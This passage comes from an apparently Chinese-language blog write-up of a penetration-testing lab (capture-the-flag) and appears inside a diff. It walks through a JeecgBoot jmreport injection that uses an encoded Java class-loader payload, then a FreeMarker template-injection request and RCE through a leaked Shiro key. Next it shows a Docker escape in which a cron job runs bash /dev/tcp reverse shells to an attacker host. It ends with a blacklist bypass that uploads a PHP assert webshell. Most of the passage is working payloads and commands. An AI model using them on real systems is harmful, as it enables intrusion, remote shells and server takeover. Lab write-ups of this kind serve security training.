AAQAZAAAACgACAAAAIQAIACIAAA==&#x27;;try&#123;clsBase64=classLoader.loadClass(&#x27;java.util.Base64&#x27;);clsDecoder=classLoader.loadClass(&#x27;java.util.Base64$Decoder&#x27;);decoder=clsBase64.getMethod(&#x27;getDecoder&#x27;).invoke(base64Clz);bytecode=clsDecoder.getMethod(&#x27;decode&#x27;,clsString).invoke(decoder,bytecodeBase64);&#125;catch(ee)&#123;try&#123;datatypeConverterClz=classLoader.loadClass(&#x27;javax.xml.bind.DatatypeConverter&#x27;);bytecode=datatypeConverterClz.getMethod(&#x27;parseBase64Binary&#x27;,clsString).invoke(datatypeConverterClz,bytecodeBase64);&#125;catch(eee)&#123;clazz1=classLoader.loadClass(&#x27;sun.misc.BASE64Decoder&#x27;);bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);&#125;&#125;clsClassLoader=classLoader.loadClass(&#x27;java.lang.ClassLoader&#x27;);clsByteArray=(&#x27;&#x27;.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod(&#x27;defineClass&#x27;,[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();&#125;;#&#123;1&#125;;\&quot;)&#125;&quot;</span>,<span class="string">&quot;dbSource&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758542742253-9f3d9c83-cc66-4d2b-a8c1-54e355471f31.png"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.22:18088/jeecg-boot/jmreport/queryFieldBySql">http://192.168.111.22:18088/jeecg-boot/jmreport/queryFieldBySql</a></p>
+<p>密码：test</p>
+<p>请求头：User-Agent: Bhimaw</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758542832415-eb98a509-4efc-4c7e-85a0-14e878f98166.png"></p>
+<h5 id="loadTableData-SSTI模板注入"><a href="#loadTableData-SSTI模板注入" class="headerlink" title="loadTableData SSTI模板注入"></a>loadTableData SSTI模板注入</h5><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /jeecg-boot/jmreport/loadTableData HTTP/<span class="number">1.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows; U; Windows NT <span class="number">5.2</span>; en-US) AppleWebKit/<span class="number">525.13</span> (KHTML, like Gecko) Chrome/<span class="number">0.2</span>.<span class="number">149.29</span> Safari/<span class="number">525.13</span></span><br><span class="line">Content-Type: application/json; charset=utf-<span class="number">8</span></span><br><span class="line">Content-Length: <span class="number">165</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">111.22</span>:<span class="number">18088</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;dbSource&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;sql&quot;</span>:<span class="string">&quot;select &#x27;&lt;#assign value=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt;$&#123;value(\&quot;whoami\&quot;)&#125;&#x27;&quot;</span>,<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;test_demo);&quot;</span>,<span class="string">&quot;pageNo&quot;</span>:<span class="number">1</span>,<span class="string">&quot;pageSize&quot;</span>:<span class="number">10</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758720038578-f335d17c-f8ac-4800-bdb1-c68409f6b976.png"></p>
+<h4 id="DocToolkit-系统RCE-成功"><a href="#DocToolkit-系统RCE-成功" class="headerlink" title="DocToolkit 系统RCE(成功)"></a><font style="color:rgb(76, 73, 72);">DocToolkit 系统RCE(成功)</font></h4><p><a target="_blank" rel="noopener" href="http://192.168.111.22:18080/">http://192.168.111.22:18080/</a></p>
+<p>在路径<code>/home/ubuntu/doctool.jar</code>找到源码，下载反编译一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758720767080-a6d957b1-7d45-46e2-9bc3-3b5474f6b3b0.png"></p>
+<p><code>/doctool.jar!/BOOT-INF/classes/com/example/doctoolkit/shiro/ShiroConfig.class</code></p>
+<p>找到 shiro 密钥<code>QZIysgMYhG7/CzIJlVpR1g==</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758720969720-525a4e5e-7411-4489-8875-5e469a6fde0b.png"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">GitHub - SummerSec&#x2F;ShiroAttack2: shiro反序列化漏洞综合利用,包含（回显执行命令&#x2F;注入内存马）修复原版中NoCC的问题 https://github.com/j1anFen/shiro_attack</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758721080251-6b3ea3fa-581e-4020-a4db-2840b5482d8d.png"></p>
+<h3 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a>Docker 逃逸</h3><p>发现当前在 docker 环境中</p>
+<p><code>cat /proc/1/cgroup</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758722520275-cd2f3d00-d865-4741-b625-5867b4ee9ded.png"></p>
+<p><code>ls -la /.dockerenv</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758722594098-d7306196-889f-4129-9cd0-7923cd1f8bba.png"></p>
+<p><code>df -h</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758723178218-e4691f59-6c4f-4645-9129-9364e6e9ead5.png"></p>
+<p>嘶 怎么个事 再看看 shiro 环境</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758724825211-23079c4f-eb29-4815-85d6-a2deda949756.png"></p>
+<p>路径：<a target="_blank" rel="noopener" href="http://192.168.111.22:18080/test">http://192.168.111.22:18080/test</a></p>
+<p>密码：pass1024</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758724906909-df88480a-557e-4cc3-af7a-2b864242b0ef.png"></p>
+<p><font style="color:rgb(51, 51, 51);"></font></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758725379748-888c16ee-febc-42ce-a051-4163f998a4bd.png"></p>
+<p><font style="color:rgb(51, 51, 51);">发现存在挂载,挂载的是宿主机的目录</font></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758725548171-6ebb2e45-4f9e-45a8-bf95-3603fe690631.png"></p>
+<p>这里有个<code>flag&#123;nItAM4shIzhenN1ubi&#125;</code></p>
+<p>挂载进行定时任务逃逸</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span>. 进入宿主机tmp目录</span><br><span class="line">cd /dev/tmp/tmp</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>. 创建test.sh 并写入内容</span><br><span class="line">cat &gt; test.sh &lt;&lt;<span class="comment">&#x27;EOF&#x27;</span></span><br><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">111.25</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">sh -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">111.25</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">/bin/sh -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">111.25</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">111.25</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">111.25</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="keyword">EOF</span></span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>. 赋予可执行权限</span><br><span class="line">chmod +x test.sh</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>. 定时任务反弹<span class="keyword">shell</span></span><br><span class="line">sed -i <span class="comment">&#x27;$a*/1 * * * * root bash /tmp/test.sh&#x27; /dev/tmp/etc/crontab</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758782254126-fac91a4f-0c21-42d8-8bf0-37ad1f061d08.png"></p>
+<p><code>nc -lv 7777</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758782298874-df73dfc6-3f75-45cd-9d8a-957d567a1e0a.png"></p>
+<h3 id="第一层内网"><a href="#第一层内网" class="headerlink" title="第一层内网"></a>第一层内网</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">root@wty-virtual-machine:~# ip a</span><br><span class="line">ip a</span><br><span class="line"><span class="number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="number">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="number">1000</span></span><br><span class="line">    link/loopback <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> brd <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">    inet <span class="number">127.0</span>.<span class="number">0.1</span>/<span class="number">8</span> scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::<span class="number">1</span>/<span class="number">128</span> scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">2</span>: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc mq state UP group default qlen <span class="number">1000</span></span><br><span class="line">    link/ether <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:b1:<span class="number">3</span>a:e7 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp3s0</span><br><span class="line">    inet <span class="number">192.168</span>.<span class="number">111.22</span>/<span class="number">24</span> brd <span class="number">192.168</span>.<span class="number">111.255</span> scope global ens160</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::<span class="number">250</span>:<span class="number">56</span>ff:feb1:<span class="number">3</span>ae7/<span class="number">64</span> scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">3</span>: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc fq_codel state UP group default qlen <span class="number">1000</span></span><br><span class="line">    link/ether <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:b1:<span class="number">62</span>:bf brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp2s1</span><br><span class="line">    inet <span class="number">192.168</span>.<span class="number">80.50</span>/<span class="number">24</span> brd <span class="number">192.168</span>.<span class="number">80.255</span> scope global ens33</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::<span class="number">250</span>:<span class="number">56</span>ff:feb1:<span class="number">62</span>bf/<span class="number">64</span> scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">4</span>: br-<span class="number">2</span>ed9e624a55e: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue state UP group default </span><br><span class="line">    link/ether <span class="number">02</span>:<span class="number">42</span>:<span class="number">86</span>:<span class="number">33</span>:b1:e6 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet <span class="number">172.20</span>.<span class="number">0.1</span>/<span class="number">16</span> brd <span class="number">172.20</span>.<span class="number">255.255</span> scope global br-<span class="number">2</span>ed9e624a55e</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::<span class="number">42</span>:<span class="number">86</span>ff:fe33:b1e6/<span class="number">64</span> scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">5</span>: br-<span class="number">5</span>c4f24880ae8: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu <span class="number">1500</span> qdisc noqueue state DOWN group default </span><br><span class="line">    link/ether <span class="number">02</span>:<span class="number">42</span>:<span class="number">90</span>:<span class="number">1</span>f:d0:a6 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet <span class="number">172.19</span>.<span class="number">0.1</span>/<span class="number">16</span> brd <span class="number">172.19</span>.<span class="number">255.255</span> scope global br-<span class="number">5</span>c4f24880ae8</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">6</span>: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu <span class="number">1500</span> qdisc noqueue state DOWN group default </span><br><span class="line">    link/ether <span class="number">02</span>:<span class="number">42</span>:<span class="number">7</span>a:e0:<span class="number">9</span>d:e5 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet <span class="number">172.17</span>.<span class="number">0.1</span>/<span class="number">16</span> brd <span class="number">172.17</span>.<span class="number">255.255</span> scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">7</span>: br-a8cbb2f18fd5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue state UP group default </span><br><span class="line">    link/ether <span class="number">02</span>:<span class="number">42</span>:a1:<span class="number">8</span>e:<span class="number">71</span>:<span class="number">2</span>a brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet <span class="number">172.18</span>.<span class="number">0.1</span>/<span class="number">16</span> brd <span class="number">172.18</span>.<span class="number">255.255</span> scope global br-a8cbb2f18fd5</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::<span class="number">42</span>:a1ff:fe8e:<span class="number">712</span>a/<span class="number">64</span> scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">9</span>: vethb31e178@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue master br-<span class="number">2</span>ed9e624a55e state UP group default </span><br><span class="line">    link/ether <span class="number">2</span>a:fa:<span class="number">8</span>c:<span class="number">44</span>:<span class="number">8</span>f:<span class="number">42</span> brd ff:ff:ff:ff:ff:ff link-netnsid <span class="number">0</span></span><br><span class="line">    inet6 fe80::<span class="number">28</span>fa:<span class="number">8</span>cff:fe44:<span class="number">8</span>f42/<span class="number">64</span> scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">11</span>: veth330c26c@if10: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue master br-<span class="number">2</span>ed9e624a55e state UP group default </span><br><span class="line">    link/ether <span class="number">7</span>a:<span class="number">0</span>a:<span class="number">7</span>e:fa:<span class="number">82</span>:<span class="number">14</span> brd ff:ff:ff:ff:ff:ff link-netnsid <span class="number">1</span></span><br><span class="line">    inet6 fe80::<span class="number">780</span>a:<span class="number">7</span>eff:fefa:<span class="number">8214</span>/<span class="number">64</span> scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">13</span>: vethea4b282@if12: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue master br-<span class="number">2</span>ed9e624a55e state UP group default </span><br><span class="line">    link/ether <span class="number">46</span>:<span class="number">70</span>:f8:<span class="number">09</span>:e5:<span class="number">9</span>b brd ff:ff:ff:ff:ff:ff link-netnsid <span class="number">2</span></span><br><span class="line">    inet6 fe80::<span class="number">4470</span>:f8ff:fe09:e59b/<span class="number">64</span> scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">15</span>: veth6409444@if14: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue master br-a8cbb2f18fd5 state UP group default </span><br><span class="line">    link/ether ea:<span class="number">0</span>d:<span class="number">25</span>:<span class="number">9</span>a:<span class="number">29</span>:<span class="number">33</span> brd ff:ff:ff:ff:ff:ff link-netnsid <span class="number">3</span></span><br><span class="line">    inet6 fe80::e80d:<span class="number">25</span>ff:fe9a:<span class="number">2933</span>/<span class="number">64</span> scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">root@wty-virtual-machine:~# </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758784300526-4b5ad58b-6fe5-4acd-89bd-0e75914c8e37.png"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway">GitHub - ph4ntonn&#x2F;Stowaway: 👻Stowaway – Multi-hop Proxy Tool for pentesters</a></p>
+<p><code>./linux_x64_agent -c 192.168.111.25:9999 -s pass --reconnect 10</code></p>
+<p><code>./macos_arm64_admin -l 9999 -s pass</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758784525912-e0618ad5-744c-4fb4-ac9c-23636baf2d96.png"></p>
+<p><code>use 0</code></p>
+<p><code>socks 55667 123 123</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758785922921-d264bc3e-33a3-4a38-8a2d-3ea3c32312e6.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1758871829667-b9f5cb5c-ed4f-42dc-be2a-b0883484891a.png"></p>
+<h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><p>先看看 web 资产,扫扫目录</p>
+<p>phpmyadmin 弱口令 root&#x2F;root，但是没办法 rce</p>
+<table>
+<thead>
+<tr>
+<th>url</th>
+<th>title</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="http://192.168.80.55/web.php">http://192.168.80.55/web.php</a></td>
+<td><font style="color:#000000;">Index of &#x2F;uploads</font></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://192.168.80.55/web.php">http://192.168.80.55/web.php</a></td>
+<td><font style="color:#000000;">文件上传表单</font></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://192.168.80.55/phpmyadmin/index.php">http://192.168.80.55/phpmyadmin/index.php</a></td>
+<td><font style="color:#000000;">phpMyAdmin</font><font style="color:#000000;"> </font></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://192.168.80.55/uploads/">http://192.168.80.55/uploads/</a></td>
+<td><font style="color:#000000;">phpinfo()</font></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://192.168.80.55/l.php">http://192.168.80.55/l.php</a></td>
+<td><font style="color:#000000;">php中文网 探针 2014</font><font style="color:#000000;"> </font></td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="http://192.168.80.55/web.php">http://192.168.80.55/web.php</a></p>
+<p>简单的黑名单后缀名绕过</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1760688256813-672cfc4f-0bf2-4762-98a3-9de2ad6279bb.png"></p>
+<p>这里简单用空格绕过、点绕过、::$DATA 绕过，其余方式自行尝试  <a target="_blank" rel="noopener" href="https://syst1m.cn/2023/08/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%BB%91%E5%90%8D%E5%8D%95%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87">文件上传绕过总结</a></p>
+<p><code>Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;1.php.&quot;</code></p>
+<p><code>Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;2.php &quot;</code></p>
+<p><code>Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;3.php::$DATA&quot;</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1760688728355-d3db8294-66e3-462b-b292-3dcd1cc682cc.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1760688811557-88ec3065-ba15-4193-bb01-aa044049a754.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1760688821532-cb1fc312-b44d-4e74-8a41-0332bbe9d745.png"></p>
+<p>尝试上传木马文件 有一点点敏感函数检测</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /up.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.80</span><span class="number">.55</span></span><br><span class="line">Content-Length: <span class="number">334</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Origin: http://<span class="number">192.168</span><span class="number">.80</span><span class="number">.55</span></span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundarychBkiANjERe4CNu8</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">131.0</span><span class="number">.6778</span><span class="number">.86</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.80</span><span class="number">.55</span>/web.php</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarychBkiANjERe4CNu8</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;fileToUpload&quot;</span>; filename=<span class="string">&quot;shell.php.&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">assert</span>($_REQUEST[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundarychBkiANjERe4CNu8</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">上传文件</span><br><span class="line">------WebKitFormBoundarychBkiANjERe4CNu8--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1760691020131-5dc0cd04-1111-449c-824e-a6ef2816a38c.png"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.80.55/uploads/shell.php">http://192.168.80.55/uploads/shell.php</a>  密码 pass</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1760691038411-e6c9a858-1ca5-4faa-9276-0b868f9849cf.png"></p>
+<p>在桌面找到第二个 <code>C:/Users/Administrator/Desktop/flag.txt</code></p>
+<p><code>flag&#123;8ASDE242NFSDJH83KSAIB3&#125;</code></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/32444164/1760708058873-24e81ea6-6578-4a93-b377-23aec9377dbc.png"></p>
+<h3 id="第二层内网"><a href="#第二层内网" class="headerlink" title="第二层内网"></a>第二层内网</h3></article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/09/20/(%E8%BD%AC%E8%BD%BD)MySQL%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83/">(转载)MySQL 漏洞利用与提权</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/07/14/%E8%87%B4%E8%BF%9C%20A8+%20V7%20XSS(CVE-2025-56451)/">致远 A8+ V7 XSS(CVE-2025-56451)</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<p>本站由 <a href="/">076w</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
